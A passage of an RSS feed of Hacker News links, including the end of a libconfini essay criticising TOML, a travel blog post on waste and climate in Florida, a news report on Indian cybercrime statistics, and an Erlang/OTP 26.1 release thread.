<p>There are of course cases where TOML works just fine, and these are the cases where JSON would also work fine (although one has always to tolerate TOML's idea to introduce a syntax for dates). But where JSON works fine, also other JSON dialects more human-friendly than TOML do.</p>
<h2 id="user-content-17-against-postels-law-by-design"><a href="#17-against-postels-law-by-design">17. Against Postel's law by design</a></h2>
<p><a href="https://en.wikipedia.org/wiki/Robustness_principle" rel="nofollow">Postel's law</a> is a good indicator of how robust a language is: the more a language is able to make sense of different types of input, the more robust the language.</p>
<p>In front of a heterogeneous landscape like that of configuration files, a parser that applies Postel's law will try to make sense of the largest possible set of habits and explore all possible solutions to avoid that errors be generated merely because of diversity.</p>
<p>TOML is a good example of a language designed against this principle. <em>The language's founding element was that of generating errors</em> when quotes were missing, and subsequent rules seem to have <em>in generating errors their only reason</em> (think of the requirement of using quotes for key names containing spaces or unicode characters, which has no justification whatsoever – if it is for aesthetical reasons, think that if you were a Chinese speaker you would rather be tempted to use quotes for the Latin characters and leave the Chinese ideograms out of quotes instead).</p>
<p>One would think that a language with such tendencies will always have only one way to express the same thing, at least. And instead no: inline tables were introduced as a duplicate of standard tables, despite being less readable and completely alien in the common practice – something vaguely similar were <a href="http://hyperrealm.github.io/libconfig/" rel="nofollow"><strong>libconfig</strong></a>'s sections, but these spanned multiple lines and constituted the only way to declare sections in that language.</p>
<p>At the end of the day TOML's main goal seems to be that of generating errors. The opposite approach, instead, would be that of taking advantage of diversity and regard it is as a strength.</p>
<h2 id="user-content-18-performance"><a href="#18-performance">18. Performance</a></h2>
<p>It is not so obvious to talk about “TOML's performance”: TOML is a language, not a particular parser. It is possible however to predict that any TOML-compliant parser will be on average <em>much slower</em> than an INI parser.</p>
<p>This entire section is being created while a TOML parser written in C (<a href="https://github.com/cktan/tomlc99"><strong>tomlc99</strong></a>) tries to parse a 50 MiB file that <strong>libconfini</strong> usually parses in half a second – and <strong>libconfini</strong>'s primary goal is not speed (yes, we gave the TOML parser an INI file to parse).</p>
<p>This is not a critique to the particular parser chosen – we can assume that <strong>tomlc99</strong> is doing its best in its hard task. The reason why a TOML parser will always be slow is the error checking fury required by the language. Where most INI parsers' approach will be that of “don't throw an error unless you really cannot make any sense of what is written in a configuration file – the application will do the rest and will do it better”, the approach of a TOML-compliant parser will be that of searching for errors even when both the application and the human would have already understood a content.</p>
<p>After 13 minutes and 20 seconds our TOML parser has finally parsed…</p>
<div data-snippet-clipboard-copy-content="54691749 bytes parsed in 800.849218 seconds.
Number of bytes parsed per second: 68292.192551

ERROR: cannot parse - line 1: extra chars after value"><pre><code>54691749 bytes parsed in 800.849218 seconds.
Number of bytes parsed per second: 68292.192551

ERROR: cannot parse - line 1: extra chars after value
</code></pre></div>
<p>Of course. Someone forgot to put quotes around the first value.</p>
<h2 id="user-content-19-human-friendly-vs-human-readable"><a href="#19-human-friendly-vs-human-readable">19. Human-friendly vs. human-readable</a></h2>
<p>“Human-friendly” and “human-readable” might sound as synonyms, but often they are not. Some texts can be very easy to read but hard to edit.</p>
<p>An inscription on the front of the Pantheon in Rome says “Marcus Agrippa, son of Lucius, made this building when consul for the third time”. This is a very human-readable text if you know a bit of Latin. But in order to edit it you would need a ladder, a chisel and the wish to ruin a millenary monument – please do not try to do it.</p>
<p>An emblematic example of this in file formats is JSON. Due to curly brackets, a systematic indentation and a strict syntax it is probably one of the most human-readable serialization formats. But exactly because of the same reasons it is not the most human-friendly one.</p>
<p>Similarly, if used with a syntax highlighter, the human-readability of TOML is comparable to that of INI. Its human-friendliness, instead, lies a few steps below.</p>
<h2 id="user-content-20-aesthetics"><a href="#20-aesthetics">20. Aesthetics</a></h2>
<p>Appearance has its importance too. TOML's specification comes with <a href="https://github.com/toml-lang/toml/blob/8296d6ba97aaaf3151a32a22ed0513301ac650bf/README.md#Example">the following example</a> for illustrating the language:</p>
<div data-snippet-clipboard-copy-content="# This is a TOML document.

title = &quot;TOML Example&quot;

[owner]
name = &quot;Tom Preston-Werner&quot;
dob = 1979-05-27T07:32:00-08:00 # First class dates

[database]
server = &quot;192.168.1.1&quot;
ports = [ 8000, 8001, 8002 ]
connection_max = 5000
enabled = true

[servers]

  # Indentation (tabs and/or spaces) is allowed but not required
  [servers.alpha]
  ip = &quot;10.0.0.1&quot;
  dc = &quot;eqdc10&quot;

  [servers.beta]
  ip = &quot;10.0.0.2&quot;
  dc = &quot;eqdc10&quot;

[clients]
data = [ [&quot;gamma&quot;, &quot;delta&quot;], [1, 2] ]

# Line breaks are OK when inside arrays
hosts = [
  &quot;alpha&quot;,
  &quot;omega&quot;
]"><pre><code># This is a TOML document.

title = "TOML Example"

[owner]
name = "Tom Preston-Werner"
dob = 1979-05-27T07:32:00-08:00 # First class dates

[database]
server = "192.168.1.1"
ports = [ 8000, 8001, 8002 ]
connection_max = 5000
enabled = true

[servers]

  # Indentation (tabs and/or spaces) is allowed but not required
  [servers.alpha]
  ip = "10.0.0.1"
  dc = "eqdc10"

  [servers.beta]
  ip = "10.0.0.2"
  dc = "eqdc10"

[clients]
data = [ ["gamma", "delta"], [1, 2] ]

# Line breaks are OK when inside arrays
hosts = [
  "alpha",
  "omega"
]
</code></pre></div>
<p>There are many ways of expressing exactly the same content using <strong>libconfini</strong>. The following is probably the most obvious one:</p>
<div data-snippet-clipboard-copy-content="# examples/ini_files/toml-like.conf

# Relax, this is an INI document.


title = INI Example

[owner]
name = madmurphy
dob = &quot;Sun, 27 May 1979 15:32:00 GMT&quot;

[database]
server = 192.168.1.1    # you can parse an IP address as an array too! :-)
ports = 8000, 8001, 8002
connection_max = 5000
enabled

  # Indentation (tabs and/or spaces) is allowed but not required
  [servers.alpha]
  ip = 10.0.0.1
  dc = eqdc10

  [servers.beta]
  ip = 10.0.0.2
  dc = eqdc10

[clients]
data = gamma : delta, 1 : 2

hosts = alpha, omega"><pre><code># examples/ini_files/toml-like.conf

# Relax, this is an INI document.


title = INI Example

[owner]
name = madmurphy
dob = "Sun, 27 May 1979 15:32:00 GMT"

[database]
server = 192.168.1.1    # you can parse an IP address as an array too! :-)
ports = 8000, 8001, 8002
connection_max = 5000
enabled

  # Indentation (tabs and/or spaces) is allowed but not required
  [servers.alpha]
  ip = 10.0.0.1
  dc = eqdc10

  [servers.beta]
  ip = 10.0.0.2
  dc = eqdc10

[clients]
data = gamma : delta, 1 : 2

hosts = alpha, omega
</code></pre></div>
<p>For a parsing example, please have a look at <code>examples/miscellanea/toml-like.c</code>.</p>
<h2 id="user-content-further-readings"><a href="#further-readings">Further readings</a></h2>
<ul>
<li><a href="https://toml.io/en/v1.0.0" rel="nofollow">TOML Specification</a></li>
<li><a href="https://hitchdev.com/strictyaml/why-not/toml/" rel="nofollow">What is wrong with TOML?</a></li>
</ul>
<h2 id="user-content-state-of-this-document"><a href="#state-of-this-document">State of this document</a></h2>
<p>Last revision: October 2021</p>

              </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Ship of Fools (127 pts)]]></title>
            <link>https://successfulsoftware.net/2023/09/19/ship-of-fools/</link>
            <guid>37595322</guid>
            <pubDate>Thu, 21 Sep 2023 09:36:21 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://successfulsoftware.net/2023/09/19/ship-of-fools/">https://successfulsoftware.net/2023/09/19/ship-of-fools/</a>, See on <a href="https://news.ycombinator.com/item?id=37595322">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
			
<p>I recently had a 3 week holiday in Florida with my family. My 17 year old son is interested in rocketry and my wife is interested in wildlife. We got to see plenty of both and had a great time. There is a lot to like about America and Americans. But the sheer waste of resources on show everywhere was pretty shocking. In Europe we absolutely aren’t doing enough to protect the environment and avert the impending climate catastrophe (I flew to Florida and drove a car there, so I am no environmental saint myself). In Florida they don’t appear to be even trying. </p>



<p>Let’s start with plastic. Everything seems to be made of plastic, wrapped in plastic or both. This is a hotel breakfast for the 3 of us. That is a serious amount of plastic. </p>



<figure><a href="https://successfulsoftware.files.wordpress.com/2023/09/img_1572-1.jpg"><img data-attachment-id="11185" data-permalink="https://successfulsoftware.net/2023/09/19/ship-of-fools/img_1572-1/" data-orig-file="https://successfulsoftware.files.wordpress.com/2023/09/img_1572-1.jpg" data-orig-size="959,552" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone 7&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4&quot;,&quot;iso&quot;:&quot;40&quot;,&quot;shutter_speed&quot;:&quot;0.0083333333333333&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_1572-1" data-image-description="" data-image-caption="" data-medium-file="https://successfulsoftware.files.wordpress.com/2023/09/img_1572-1.jpg?w=300" data-large-file="https://successfulsoftware.files.wordpress.com/2023/09/img_1572-1.jpg?w=625" src="https://successfulsoftware.files.wordpress.com/2023/09/img_1572-1.jpg?w=959" alt="" srcset="https://successfulsoftware.files.wordpress.com/2023/09/img_1572-1.jpg 959w, https://successfulsoftware.files.wordpress.com/2023/09/img_1572-1.jpg?w=150 150w, https://successfulsoftware.files.wordpress.com/2023/09/img_1572-1.jpg?w=300 300w, https://successfulsoftware.files.wordpress.com/2023/09/img_1572-1.jpg?w=768 768w" sizes="(max-width: 959px) 100vw, 959px"></a></figure>



<p>Plastic cutlery is the order of the day. And even the plastic cutlery is individually wrapped in plastic! The very cheapest hotels in the UK give you metal cutlery.</p>



<figure><a href="https://successfulsoftware.files.wordpress.com/2023/09/img_1569.jpg"><img data-attachment-id="11187" data-permalink="https://successfulsoftware.net/2023/09/19/ship-of-fools/img_1569/" data-orig-file="https://successfulsoftware.files.wordpress.com/2023/09/img_1569.jpg" data-orig-size="1000,736" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone 7&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1691915877&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;3.99&quot;,&quot;iso&quot;:&quot;20&quot;,&quot;shutter_speed&quot;:&quot;0.0026109660574413&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_1569" data-image-description="" data-image-caption="" data-medium-file="https://successfulsoftware.files.wordpress.com/2023/09/img_1569.jpg?w=300" data-large-file="https://successfulsoftware.files.wordpress.com/2023/09/img_1569.jpg?w=625" src="https://successfulsoftware.files.wordpress.com/2023/09/img_1569.jpg?w=1000" alt="" srcset="https://successfulsoftware.files.wordpress.com/2023/09/img_1569.jpg 1000w, https://successfulsoftware.files.wordpress.com/2023/09/img_1569.jpg?w=150 150w, https://successfulsoftware.files.wordpress.com/2023/09/img_1569.jpg?w=300 300w, https://successfulsoftware.files.wordpress.com/2023/09/img_1569.jpg?w=768 768w" sizes="(max-width: 1000px) 100vw, 1000px"></a></figure>



<figure><a href="https://successfulsoftware.files.wordpress.com/2023/09/img_1573.jpg"><img data-attachment-id="11186" data-permalink="https://successfulsoftware.net/2023/09/19/ship-of-fools/img_1573/" data-orig-file="https://successfulsoftware.files.wordpress.com/2023/09/img_1573.jpg" data-orig-size="750,1000" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone 7&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1691999126&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;3.99&quot;,&quot;iso&quot;:&quot;20&quot;,&quot;shutter_speed&quot;:&quot;0.0073529411764706&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_1573" data-image-description="" data-image-caption="" data-medium-file="https://successfulsoftware.files.wordpress.com/2023/09/img_1573.jpg?w=225" data-large-file="https://successfulsoftware.files.wordpress.com/2023/09/img_1573.jpg?w=625" src="https://successfulsoftware.files.wordpress.com/2023/09/img_1573.jpg?w=750" alt="" srcset="https://successfulsoftware.files.wordpress.com/2023/09/img_1573.jpg 750w, https://successfulsoftware.files.wordpress.com/2023/09/img_1573.jpg?w=113 113w, https://successfulsoftware.files.wordpress.com/2023/09/img_1573.jpg?w=225 225w" sizes="(max-width: 750px) 100vw, 750px"></a></figure>



<p>Apples were individually wrapped in plastic. </p>



<figure><a href="https://successfulsoftware.files.wordpress.com/2023/09/img_1578.jpg"><img data-attachment-id="11188" data-permalink="https://successfulsoftware.net/2023/09/19/ship-of-fools/img_1578/" data-orig-file="https://successfulsoftware.files.wordpress.com/2023/09/img_1578.jpg" data-orig-size="750,1000" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone 7&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1691999172&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;3.99&quot;,&quot;iso&quot;:&quot;25&quot;,&quot;shutter_speed&quot;:&quot;0.016949152542373&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_1578" data-image-description="" data-image-caption="" data-medium-file="https://successfulsoftware.files.wordpress.com/2023/09/img_1578.jpg?w=225" data-large-file="https://successfulsoftware.files.wordpress.com/2023/09/img_1578.jpg?w=625" src="https://successfulsoftware.files.wordpress.com/2023/09/img_1578.jpg?w=750" alt="" srcset="https://successfulsoftware.files.wordpress.com/2023/09/img_1578.jpg 750w, https://successfulsoftware.files.wordpress.com/2023/09/img_1578.jpg?w=113 113w, https://successfulsoftware.files.wordpress.com/2023/09/img_1578.jpg?w=225 225w" sizes="(max-width: 750px) 100vw, 750px"></a></figure>



<p>We even saw oranges wrapped in plastic. Nature already provided oranges with their own wrapper! I don’t remember the plastic issue being as bad when I travelled through Wyoming, Utah and Colorado in 1999. Maybe it’s a hangover from COVID?</p>



<p>And then there are the cars. We did a quick informal survey and over half the vehicles on the road were massive SUVs and even more massive pickup trucks, with macho names like ‘Raptor’ and ‘Titan’. The very low tax on petrol/gas (by European standards) makes this possible. These pickup trucks are clearly being used mostly by people from the suburbs who do not need a huge pickup truck. We hired a ‘mid-size’ (but big by European standards) SUV ourselves as, in a previous trip, we had found it quite intimidating to drive a European sized saloon car on American roads. </p>



<p>The front of these pick-up trucks is so high that a pedestrian hit by one is definitely going under, rather than over. Especially the ridiculous ‘raised’ pickup trucks, which are very common.</p>



<figure><a href="https://successfulsoftware.files.wordpress.com/2023/09/img_3534.jpg"><img data-attachment-id="11190" data-permalink="https://successfulsoftware.net/2023/09/19/ship-of-fools/img_3534/" data-orig-file="https://successfulsoftware.files.wordpress.com/2023/09/img_3534.jpg" data-orig-size="2933,2336" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone SE (2nd generation)&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4&quot;,&quot;iso&quot;:&quot;20&quot;,&quot;shutter_speed&quot;:&quot;0.0027932960893855&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_3534" data-image-description="" data-image-caption="" data-medium-file="https://successfulsoftware.files.wordpress.com/2023/09/img_3534.jpg?w=300" data-large-file="https://successfulsoftware.files.wordpress.com/2023/09/img_3534.jpg?w=625" src="https://successfulsoftware.files.wordpress.com/2023/09/img_3534.jpg?w=1024" alt="" srcset="https://successfulsoftware.files.wordpress.com/2023/09/img_3534.jpg?w=1024 1024w, https://successfulsoftware.files.wordpress.com/2023/09/img_3534.jpg?w=2048 2048w, https://successfulsoftware.files.wordpress.com/2023/09/img_3534.jpg?w=150 150w, https://successfulsoftware.files.wordpress.com/2023/09/img_3534.jpg?w=300 300w, https://successfulsoftware.files.wordpress.com/2023/09/img_3534.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"></a></figure>



<p>Not that there are many pedestrians in Florida, of course. You are expected to have a car and drive everywhere. You can even eat your breakfast in your car.</p>



<figure><a href="https://successfulsoftware.files.wordpress.com/2023/09/dsc_0639.jpg"><img data-attachment-id="11192" data-permalink="https://successfulsoftware.net/2023/09/19/ship-of-fools/dsc_0639/" data-orig-file="https://successfulsoftware.files.wordpress.com/2023/09/dsc_0639.jpg" data-orig-size="1000,526" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;5&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;NIKON D7000&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;32&quot;,&quot;iso&quot;:&quot;800&quot;,&quot;shutter_speed&quot;:&quot;0.01&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="dsc_0639" data-image-description="" data-image-caption="" data-medium-file="https://successfulsoftware.files.wordpress.com/2023/09/dsc_0639.jpg?w=300" data-large-file="https://successfulsoftware.files.wordpress.com/2023/09/dsc_0639.jpg?w=625" src="https://successfulsoftware.files.wordpress.com/2023/09/dsc_0639.jpg?w=1000" alt="" srcset="https://successfulsoftware.files.wordpress.com/2023/09/dsc_0639.jpg 1000w, https://successfulsoftware.files.wordpress.com/2023/09/dsc_0639.jpg?w=150 150w, https://successfulsoftware.files.wordpress.com/2023/09/dsc_0639.jpg?w=300 300w, https://successfulsoftware.files.wordpress.com/2023/09/dsc_0639.jpg?w=768 768w" sizes="(max-width: 1000px) 100vw, 1000px"></a><figcaption>The breakfast drive-thru queue at Fort Myers Dunkin Donuts.</figcaption></figure>



<p>The provision of pavements/sidewalks is decidely lacking and public transport is pretty much non-existent. If you are too poor to own a car, hard luck. There did seem to be some cycle lanes, but they ran along major roads and weren’t segregated from all the enormous vehicles. They looked utterly terrifying. No wonder no-one was using them. Perhaps cyclists had tried, but they had all been run over.</p>



<p>Everywhere has air con and it all seems to run 24×7. Often with doors left open. When you turn up to your hotel/motel room, the air con is running and it doesn’t turn off when you take your card out of the slot to leave the room. It has probably been running in every room since the hotel was built, regardless of whether the rooms are occupied or not. Heaven forbid that you should have to wait 2 minutes for the air con to cool the room down. </p>



<p>This might be ok if the air con was powered by solar. But it isn’t. We hardly saw a solar panel in our whole trip to ‘The Sunshine State’. This is hard to fathom, as there are solar panels everywhere in temperate and cloudy Britain. When we asked one of the locals why she didn’t have solar, she told us that solar power was penalised by the power company, so it wasn’t worth it. We didn’t see a single wind turbine either.</p>



<p>The irony is that Florida is one of the most vulnerable places on earth to climate change. It is already ridiculously hot in the summer. A few more degrees of extra temperature will make it unbearable outside your air conditioned room or vehicle. Higher temperatures means more air con, which means more carbon in the atmosphere, which means even higher temperatures. Florida has a <a href="https://www.statista.com/statistics/1325529/lowest-points-united-states-state/">mean elevation of just 31m/100ft</a> above sea level. The majority of Miami-Dade county is <a href="https://wusfnews.wusf.usf.edu/environment/2023-03-11/miamis-hidden-high-ground-what-sea-rise-risk-means-for-some-prime-real-estate">less than 2m/6ft above sea level</a> (possibly less, depending on when you are reading this). The only thing we saw that looked like a hill in Florida, was in fact a huge landfill. Probably mostly full of single-use plastic cutlery. The rich are already starting to move to higher ground in Miami. Maybe only the landfills will be left above sea level by the end of the century? Florida is also  regularly devastated by hurricanes. The devastation left by 2022 <a href="https://en.wikipedia.org/wiki/Hurricane_Ian">category 5 hurricane Ian</a> is still very obvious and <a href="https://en.wikipedia.org/wiki/Hurricane_Idalia">category 4 hurricane Idalia</a> hit a few days after we left. Rising sea temperatures can only lead to more devastating hurricanes. </p>



<p>And Florida isn’t even one of the worst offenders, placing 39th out of the 50 US states with around <a href="https://solarpower.guide/solar-energy-insights/states-ranked-carbon-dioxide-emissions">10.8 metric tons of CO2 per capita per year</a>. In part due to the lack of any heavy industry. The worst offending state in the USA is Wyoming with a whopping 104.5  metric tons of CO2 per capita per year. Across the country Americans average <a href="https://www.worldometers.info/co2-emissions/co2-emissions-per-capita/">15.3 tons per capita per year</a>, compared to 5.6 tons for the UK. And the USA isn’t even the worst offender. Qatar clocks in at 38.1 tons per capita per year.</p>



<p>Climate change is not some minor inconvenience where we lose a few obscure species of frogs and have to wear a bit more sunscreen. We could be talking about widescale crop failures and extreme weather events making large parts of the globe unliveable. Leading to famine and migration on a scale way beyond anything we have seen so far. Given the seriousness of the situation it is depressing to see such profligate waste. My fear is that other people will look at places like Florida and think “why am I even trying to do the right thing? Look at them!” and not even try.</p>



<p>We are in trouble. The current system of sovereign states with politicians driven by short-term goals is poorly placed to fix long-term, global problems. And the billionaires are not going to save us. They are the main beneficiaries of the current system and they are going to use their money and power to keep it that way. If we let them. Geo-engineering is hugely risky. Carbon sequestration looks unlikely to make any meaningful difference. Moving to Mars is a pipedream for 99.9999% of the population. This is the only planet in the universe we have evolved to live on. We are stuck here with the mess we have created in a slow motion <a href="https://en.wikipedia.org/wiki/Tragedy_of_the_commons">tragedy of the commons.</a> Individual choice is not going to cut it. We need deep structural change. Much higher taxes on fossil fuels and less enormous pickup trucks for a start. We need to get our act together, and soon. For ourselves and our children. But, having seen the situation in Florida, I don’t hold out much hope.</p>
					</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[India's biggest tech centers named as cyber crime hotspots (183 pts)]]></title>
            <link>https://www.theregister.com/2023/09/21/india_cybercrime_trends_report/</link>
            <guid>37594855</guid>
            <pubDate>Thu, 21 Sep 2023 08:39:30 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.theregister.com/2023/09/21/india_cybercrime_trends_report/">https://www.theregister.com/2023/09/21/india_cybercrime_trends_report/</a>, See on <a href="https://news.ycombinator.com/item?id=37594855">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="body">
<p>India is grappling with a three-and-a-half year surge in cyber crime, with analysis suggesting cities like Bengaluru and Gurgaon – centers of India's tech development – are also hubs of evil activity.</p>
<p>The report – <i>A Deep Dive into Cybercrime Trends Impacting India</i> from the non-profit Future Crime Research Foundation (FCRF) – identified cyber crime hot spots, as well as the most popular types of infosec assaults, from January 2020 until June 2023.</p>
<p>"The analysis of the top 10 cyber crime-prone districts in India reveals several common factors contributing to their vulnerability. These include geographical proximity to major urban centers, limited cyber security infrastructure, socioeconomic challenges, and low digital literacy," <a target="_blank" href="https://www.futurecrime.org/cyber-crime-research">states</a> the report.</p>

    

<p>Several of the most cyber crime-prone top geographies house tech hubs. Gurgaon and Bangalore – both <a target="_blank" href="https://hightech.cbrevancouver.com/wp-content/uploads/2019/05/Asia-Pacific-Major-Report_Programming-Asia-Pacific-Tech-Cities-as-Global-Tech-Hubs_April-2019.pdf">considered</a> [PDF] among the top five most attractive cities for the IT industry in Asia – featured for the wrong reasons.</p>

        


        

<p>The Gurgaon district, which is home to a planned IT-focused city of the same name, made number six on FCRF's list. The district accounted for 8.1 percent of reported cyber crime, despite being home to less than 0.2 percent of India's population.</p>
<p>FCRF cited the high crime rate as "likely influenced by its status as a major corporate and IT hub, making it an attractive target for cyber criminals seeking valuable data or financial gains."</p>

        

<p>Outsourcing services and call centers are prominent in the area. Globally recognised tech names including Google, Microsoft, IBM India, Accenture, Cognizant, Infosys, Wipro and more all have presence in the city.</p>
<p>And while the city is known for economic affluence – it's <a target="_blank" href="https://www.gmda.gov.in/aboutus/metropolitan-area.html?language=en">said</a> to have the third highest per capita income in India – the Foundation suggested "disparities in digital literacy and cyber security awareness" could be factors likely to drive criminal activity.</p>
<ul>

<li><a href="https://www.theregister.com/2023/03/27/indian_cybergang_busted_for_selling/">India-based cybergang busted for selling fake KFC franchises</a></li>

<li><a href="https://www.theregister.com/2023/07/06/hpe_india_server_manufacturing/">HPE prepares for spicy affair with India to churn out $1B worth of servers</a></li>

<li><a href="https://www.theregister.com/2022/11/01/india_lending_app_crackdown_ordered/">India's Home Ministry cracks down on predatory lending apps following suicides</a></li>

<li><a href="https://www.theregister.com/2023/09/05/qualys_top_20_vulnerabilities/">You patched yet? Years-old Microsoft security holes still hot targets for cyber-crooks</a></li>
</ul>
<p>Meanwhile, Bangalore – in the district of Karnataka – was named by FCRF as an emerging cyber crime hotspot. The city is known as the "Silicon Valley of India" thanks to its proliferation of IT employers – including Infosys, Wipro, Tata Consultancy Services, IBM India, Microsoft, Google, Amazon Intel, Cisco, Samsung Research Institute, Nvidia Graphics and more.</p>
<p>Topping the list was Gurgaon's neighbor Bharatpur, with 18 percent of India's overall cyber crime. FCRF cites limited employment opportunities and lack of digital literacy as reasons for the region's prevalence of crime, as well as the fact it contains major urban centers like Delhi and Jaipur.</p>
<p>Mathura – a district filled with significant religious sites – took second place with 12 percent. The FCRF cited limited cyber security infrastructure and the area's status as a tourist attraction among likely reasons it was so popular with crims.</p>

        

<p>Another finding in the report was that of all reported cyber crimes in India, almost half (47.25 percent) involved Unified Payments Interface (UPI) fraud. Debit, credit card and sim swap fraud came in a distant second place with 11.27 percent. Overall, financially motivated crime accounted for 77.41 percent of incidents. ®</p>                                
                    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Erlang/OTP 26.1 Released (205 pts)]]></title>
            <link>https://erlangforums.com/t/erlang-otp-26-1-released/2886</link>
            <guid>37594525</guid>
            <pubDate>Thu, 21 Sep 2023 07:56:14 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://erlangforums.com/t/erlang-otp-26-1-released/2886">https://erlangforums.com/t/erlang-otp-26-1-released/2886</a>, See on <a href="https://news.ycombinator.com/item?id=37594525">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="post_1">
            <div>
              


              <p><span>
                  <time itemprop="datePublished" datetime="2023-09-21T07:08:50Z">
                    September 21, 2023,  7:08am
                  </time>
                  <meta itemprop="dateModified" content="2023-09-21T07:08:50Z">
              <span itemprop="position">1</span>
              </span>
            </p></div>
            <div itemprop="articleBody">
              <h2><a name="otp-261-httpswwwerlangorgnews165otp-261-1" href="#otp-261-httpswwwerlangorgnews165otp-261-1"></a>OTP 26.1 <a href="https://www.erlang.org/news/165#otp-261">#</a></h2>
<p>Erlang/OTP 26.1 is the first maintenance patch package for OTP 26, with mostly bug fixes as well as improvements.</p>
<p>For details about bugfixes and potential incompatibilities see the <a href="https://erlang.org/download/otp_src_25.1.readme">Erlang 26.1 README</a></p>
<p>The Erlang/OTP source can also be found at GitHub on the official Erlang repository, <a href="https://github.com/erlang/otp">GitHub - erlang/otp: Erlang/OTP</a></p>
<p>Download links for this and previous versions are found here</p>
<ul>
<li><a href="https://www.erlang.org/downloads">Downloads - Erlang/OTP</a></li>
</ul>
            </div>

            

            

          </div><div itemprop="comment" id="post_2" itemscope="" itemtype="http://schema.org/Comment">
              <p>Just a heads up, you linked to the Erlang <strong>25</strong>.1 README instead of <strong>26</strong>.1.</p>
<p>Great job to everyone involved with this release!</p>
            </div><div id="post_3" itemprop="comment" itemscope="" itemtype="http://schema.org/Comment">
            <div>
              <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
                <a itemprop="url" href="https://erlangforums.com/u/nzok"><span itemprop="name">nzok</span></a>
                
              </span></p>


              <p><span>
                  <time itemprop="datePublished" datetime="2023-09-21T11:46:40Z">
                    September 21, 2023, 11:46am
                  </time>
                  <meta itemprop="dateModified" content="2023-09-21T11:46:40Z">
              <span itemprop="position">3</span>
              </span>
            </p></div>
            <div itemprop="text">
              <p>Speaking of releases,</p>
<p>% sudo apt update<br>
…<br>
Err:18 <a href="http://binaries.erlang-solutions.com/debian" rel="noopener nofollow ugc">http://binaries.erlang-solutions.com/debian</a> jammy Release<br>
404 Not Found [IP: 13.33.21.93 80]<br>
…<br>
E: The repository ‘<a href="http://binaries.erlang-solutions.com/debian" rel="noopener nofollow ugc">http://binaries.erlang-solutions.com/debian</a> jammy Release’ does not have a Release file.</p>
<p>What do I do about this, especially to get an updated Erlang?</p>
            </div>

            

            

          </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Philips Hue will soon force users to create an account (143 pts)]]></title>
            <link>https://defcon.social/@mysk/111097362983335713</link>
            <guid>37594377</guid>
            <pubDate>Thu, 21 Sep 2023 07:38:19 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://defcon.social/@mysk/111097362983335713">https://defcon.social/@mysk/111097362983335713</a>, See on <a href="https://news.ycombinator.com/item?id=37594377">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[OpenBSD/ARM64 on Hetzner Cloud (200 pts)]]></title>
            <link>https://www.undeadly.org/cgi?action=article;sid=20230921073556</link>
            <guid>37594365</guid>
            <pubDate>Thu, 21 Sep 2023 07:36:31 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.undeadly.org/cgi?action=article;sid=20230921073556">https://www.undeadly.org/cgi?action=article;sid=20230921073556</a>, See on <a href="https://news.ycombinator.com/item?id=37594365">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
<p>Contributed by
<a href="https://undeadly.org/">Paul 'WEiRD' de Weerd</a>
on <time datetime="2023-09-21T07:20:10Z">2023-09-21</time>
from the ARMing Puffy for the cloud dept.</p>
<p>Frederic Cambus (<code>fcambus@</code>) wrote a blogpost about running OpenBSD on the arm64-based cloudservers provided by Hetzner. For now, only -current will work,
because the new <a href="https://man.openbsd.org/viogpu.4"><code>viogpu(4)</code></a>
